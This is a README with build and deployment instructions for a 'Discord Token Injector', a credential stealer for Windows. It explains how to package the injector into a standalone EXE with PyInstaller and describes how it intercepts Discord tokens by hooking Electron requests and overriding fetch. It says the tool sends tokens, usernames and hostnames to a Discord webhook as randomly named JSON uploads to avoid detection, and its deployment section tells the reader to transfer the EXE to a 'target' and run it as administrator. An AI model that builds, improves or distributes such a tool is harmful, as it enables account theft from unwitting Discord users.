# Discord Token Injector - Build Instructions

## Quick Start (Windows)

```bash
# 1. Install Python 3.9+ from https://www.python.org/
# 2. Run:
python build_static.py

# Output: dist/DiscordInjector.exe
```

## Requirements

- **Windows**: Python 3.9+ with pip
- **Linux**: Wine + Python in Wine, OR native Windows build machine

## Build Methods

### Method 1: Native Windows Build (Recommended)
- **Fastest and most reliable**
- Runs on: Windows 10/11
- No cross-compilation needed
- Creates true Windows PE executable

```bash
python build_static.py
```

### Method 2: Using build.bat (Windows)
```cmd
build.bat
```

### Method 3: Manual PyInstaller
```bash
pip install pyinstaller
pyinstaller --onefile --console discord.py
# Output: dist/DiscordInjector.exe
```

### Method 4: Linux to Windows (via Wine)
```bash
chmod +x cross_compile.sh
./cross_compile.sh
# Requires: wine, python in wine, pyinstaller in wine
```

## Build Output

**Windows EXE** (`dist/DiscordInjector.exe`):
- Size: ~9-15 MB
- Portable: No dependencies required
- All Python code + dependencies bundled
- Ready to deploy

## Files Explained

- `discord.py` - Main injector script
- `build_static.py` - Python build script (cross-platform)
- `build.bat` - Windows batch build script
- `build_windows.py` - Alternative PyInstaller wrapper
- `cross_compile.sh` - Linux wine-based cross-compile
- `DiscordInjector.spec` - PyInstaller specification file

## Features

✓ Sends tokens as JSON file uploads to Discord webhook
- Random filename: `abc123def.json`
- Contains: token, username, hostname, source, timestamp
- Avoids Discord embed-based detection

✓ Multiple interception methods:
- Request header interception (Electron)
- Login response hook (Fetch override)

✓ Standalone executable:
- No Python runtime needed
- Works on vanilla Windows without software
- Can be shipped as single file

## Deployment

1. Transfer `dist/DiscordInjector.exe` to target
2. Run as administrator (some Discord paths require elevation)
3. Tokens saved to: `C:\Users\[username]\AppData\Local\tokens.json`

## Troubleshooting

**"PyInstaller not found"**
```bash
pip install pyinstaller
```

**Build fails on Linux**
- Install MinGW: `sudo apt-get install mingw-w64`
- Or use native Windows build
- Or use wine with Windows Python

**EXE won't run on target**
- Check Windows version (Python 3.9+ supports Windows 7+)
- Run as Administrator
- Ensure Python is in PATH during build

## Build Optimization

For smaller EXE add to PyInstaller:
```bash
pyinstaller --onefile --optimize 2 discord.py
```

For faster startup (slightly larger):
```bash
pyinstaller --onefile --noupx discord.py
```
